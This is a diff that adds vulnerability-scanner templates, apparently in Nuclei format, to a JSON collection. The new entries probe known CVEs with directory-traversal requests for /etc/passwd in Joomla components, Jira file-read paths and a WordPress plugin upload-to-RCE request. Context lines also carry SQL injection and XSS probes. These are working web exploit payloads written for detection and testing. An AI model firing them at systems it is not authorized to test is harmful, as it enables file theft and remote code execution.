@@ -728,6 +728,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1314",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Highslide JS (com_hsconfig) component 1.5 and 2.0.9 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Highslide 1.5 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12086",
+          "https://www.cvedetails.com/cve/CVE-2010-1314"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_hsconfig&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1345",
       "info": {
         "author": "daffainfo",
@@ -867,6 +904,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1532",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the givesight PowerMail Pro (com_powermail) component 1.5.3 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component PowerMail Pro 1.5.3 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12118",
+          "https://www.cvedetails.com/cve/CVE-2010-1532"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_powermail&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1533",
       "info": {
         "author": "daffainfo",
@@ -967,6 +1041,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_smartsite&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1718",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in archeryscores.php in the Archery Scores (com_archeryscores) component 1.0.6 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Archery Scores 1.0.6 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12282",
+          "https://www.cvedetails.com/cve/CVE-2010-1718"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_archeryscores&controller=../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -10019,6 +10130,43 @@
       ]
     },
     {
+      "id": "CVE-2018-6008",
+      "info": {
+        "author": "daffainfo",
+        "description": "Arbitrary File Download exists in the Jtag Members Directory 5.3.7 component for Joomla! via the download_file parameter.",
+        "name": "Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download",
+        "reference": [
+          "https://www.exploit-db.com/exploits/43913",
+          "https://www.cvedetails.com/cve/CVE-2018-6008"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2018,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-6910",
       "info": {
         "author": "pikpikcu",
@@ -13278,8 +13426,10 @@
             }
           ],
           "matchers-condition": "and",
-          "raw": [
-            "GET /s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: deflate\n"
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/s/{{randstr}}/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml",
+            "{{BaseURL}}/s/{{randstr}}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
           ]
         }
       ]
@@ -14412,6 +14562,47 @@
           ],
           "raw": [
             "POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: keep-alive\nX-Requested-With: XMLHttpRequest\nContent-Length: 218\nContent-Type: application/x-www-form-urlencoded\n\nnodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-12800",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "The drag-and-drop-multiple-file-upload-contact-form-7 plugin before 1.3.3.3 for WordPress allows Unrestricted File Upload and remote code execution by setting supported_type to php% and uploading a .php% file.",
+        "name": "WordPress 'Drag & Drop Multiple File Upload - Contact Form 7' Plugin - Pre-auth RCE",
+        "reference": "https://github.com/amartinsec/CVE-2020-12800",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "CVE-2020-12800-{{randstr}}"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/plain"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------350278735926454076983690555601\nX-Requested-With: XMLHttpRequest\n\n-----------------------------350278735926454076983690555601\nContent-Disposition: form-data; name=\"supported_type\"\n\ntxt%\n-----------------------------350278735926454076983690555601\nContent-Disposition: form-data; name=\"size_limit\"\n\n5242880\n-----------------------------350278735926454076983690555601\nContent-Disposition: form-data; name=\"action\"\n\ndnd_codedropz_upload\n-----------------------------350278735926454076983690555601\nContent-Disposition: form-data; name=\"type\"\n\nclick\n-----------------------------350278735926454076983690555601\nContent-Disposition: form-data; name=\"upload-file\"; filename=\"{{randstr}}.txt%\"\nContent-Type: application/x-httpd-php\n\nCVE-2020-12800-{{randstr}}\n-----------------------------350278735926454076983690555601--\n",
+            "GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.txt HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -17212,6 +17403,42 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-29453",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "The CachingResourceDownloadRewriteRule class in Jira Server and Jira Data Center allowed unauthenticated remote attackers to read arbitrary files within WEB-INF and META-INF directories via an incorrect path access check.",
+        "name": "Pre-Auth Limited Arbitrary File Read in Jira Server",
+        "reference": "https://jira.atlassian.com/browse/JRASERVER-72014",
+        "severity": "medium",
+        "tags": "cve,cve2020,atlassian,jira,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<groupId>com.atlassian.jira</groupId>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/s/{{randstr}}/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml",
+            "{{BaseURL}}/s/{{randstr}}/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
           ]
         }
       ]
